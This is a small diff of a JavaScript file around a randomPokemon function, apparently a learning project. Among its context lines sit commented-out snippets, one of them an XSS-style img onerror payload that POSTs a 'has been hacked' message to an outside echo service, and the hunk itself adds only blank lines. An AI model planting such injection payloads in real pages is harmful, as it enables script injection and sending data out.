@@ -29,3 +29,16 @@ function randomPokemon(){
 /* data.name.innerHTML = 'function pepe() {console.log("HAHAHA maligno???");console.log("¿Creeis que maligno entrará en nuestra web?")}; pepe()' */
 
  // data.bug = `<img src='x' onerror='fetch("https://reqbin.com/echo/post/json", { method: "POST", body: JSON.stringify({userData: "HA HA HA, has been hacked", mode: "no-cors"}) })'>`
+
+
+
+
+
+
+
+
+
+
+
+
+ 
